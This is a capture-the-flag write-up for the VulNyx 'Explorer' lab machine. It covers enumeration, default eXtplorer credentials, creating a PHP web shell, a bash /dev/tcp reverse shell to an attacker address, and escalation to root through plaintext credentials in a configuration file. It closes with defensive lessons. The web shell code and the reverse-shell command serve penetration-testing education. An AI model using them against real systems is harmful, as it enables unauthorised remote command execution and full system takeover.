# [VulNyx](https://vulnyx.com/): Explorer Writeup

<img width="846" height="437" alt="Screenshot 2026-08-17 233307" src="https://github.com/user-attachments/assets/856efaa9-dde6-45fb-af5a-f415d79bb098" />

---

# 🎯 Target Information

- **Platform:** VulNyx
- **Machine Name:** Explorer
- **Target IP:** `192.168.1.53`
- **Key Vulnerabilities:**
  - Default Credentials
  - Arbitrary File Creation
  - Web Shell Upload
  - Sensitive Credential Disclosure
  - Privilege Escalation via Root Credentials

---

# 🔎 Enumeration

First, perform a full TCP port scan against the target using Nmap.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.53
```

## Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.53                    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 09:24 -0700
Nmap scan report for 192.168.1.53
Host is up (0.0016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.65 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/extplorer
MAC Address: 00:0C:29:17:6F:2D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
```

### Findings

- **22** → SSH
- **80** → Apache HTTP Server
- `/extplorer` → Disclosed through `robots.txt`

---

# 🌐 Web Enumeration

The Nmap scan reveals an entry in `robots.txt`:

```text
/extplorer
```

Navigate to:

```text
http://192.168.1.53/extplorer
```

<img width="1918" height="588" alt="Screenshot_2026-08-17_09_30_05" src="https://github.com/user-attachments/assets/37ae6b44-4a6e-460b-bc65-2c61ca3bc27e" />

The page presents an **eXtplorer** login interface.

---

# 🔐 eXtplorer Authentication

Try the default credentials:

```text
Username: admin
Password: admin
```

The credentials are accepted successfully, providing access to the eXtplorer file management interface.

---

# 🐚 Web Shell Upload

Since eXtplorer provides file-management functionality, create a new file named:

<img width="1918" height="743" alt="Screenshot_2026-08-17_09_36_45" src="https://github.com/user-attachments/assets/94d69004-af60-431b-9ec9-1f0dba946b9a" />

```text
shell.php
```

Edit the file and insert the following PHP web shell:

<img width="1682" height="376" alt="Screenshot_2026-08-17_09_37_04" src="https://github.com/user-attachments/assets/d930a6c4-93a6-43f7-8f41-6acad1f3bb16" />

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

Save the file.

The uploaded shell can then be accessed at:

```text
http://192.168.1.53/shell.php
```

<img width="1918" height="470" alt="Screenshot_2026-08-17_09_38_36" src="https://github.com/user-attachments/assets/6b6453a5-b364-482a-9070-3426e8729e08" />

The web shell is successfully accessible and allows command execution on the target.

---

# 🐚 Reverse Shell

Start a Netcat listener on the attacker machine.

```bash
nc -lnvp 443
```

Execute the following command through the web shell:

```bash
bash -c 'bash -i > /dev/tcp/192.168.1.2/443 0>&1'
```

A reverse shell is received successfully.

---

# 🖥 Shell Upgrade

Upgrade the reverse shell to a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then run:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The shell is now upgraded to an interactive TTY.

---

# 🏁 User Flag

The initial shell is obtained as `www-data`.

The user flag is located in `/home`.

```bash
cat /home/user.txt
```

## Result

```text
www-data@explorer$ cat /home/user.txt 
3f2580ab16ac82c9e0adaf0dad3a900d
```

---

# 🔍 Credential Enumeration

The `www-data` user cannot directly use `sudo` because the required password is unknown.

Search the filesystem for PHP configuration files.

```bash
find / -type f -name "conf*.php" 2>/dev/null
```

## Result

```text
www-data@explorer:/$ find / -type f -name conf*.php 2>/dev/null 
/var/www/html/extplorer/configuration.ext.php
/var/www/html/extplorer/config/conf.php
```

The `conf.php` file is particularly interesting because it may contain application credentials.

Read the file:

```bash
cat /var/www/html/extplorer/config/conf.php
```

## Result

```php
$GLOBALS['DB_USER'] = 'root';
$GLOBALS['DB_PASSWORD'] = 'AccessGranted#1';
```

The configuration file exposes credentials for the `root` account.

```text
Username: root
Password: AccessGranted#1
```

---

# ⬆️ Privilege Escalation

Use the recovered credentials to switch to the root account.

```bash
su -
```

Enter the recovered password:

```text
AccessGranted#1
```

Verify the current privileges:

```bash
id
```

## Result

```text
www-data@explorer:/$ su -
Password: 
root@explorer:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@explorer:~#
```

We successfully obtained a root shell.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
root@explorer:~# cat /root/root.txt 
9a045d36c5a28f01784bdcfb326accfe
root@explorer:~#
```

---

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Enumeration | Nmap |
| Web Enumeration | `robots.txt` |
| Initial Access | Default eXtplorer Credentials |
| Code Execution | PHP Web Shell |
| Remote Access | Reverse Shell |
| Shell Upgrade | Interactive TTY |
| Credential Discovery | PHP Configuration File |
| Privilege Escalation | Recovered Root Credentials |
| Root Access | `su -` |
| Flags | User + Root |

---

# 🚀 Key Takeaways

- Default credentials such as `admin:admin` should never be used in production environments.
- File-management applications should restrict which file types can be uploaded or created.
- Web-accessible directories should not allow users to upload executable server-side scripts.
- Sensitive credentials should never be stored in plaintext configuration files.
- Configuration files containing database or privileged credentials must be properly protected.
- Reusing privileged credentials across services can turn a single configuration disclosure into full system compromise.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
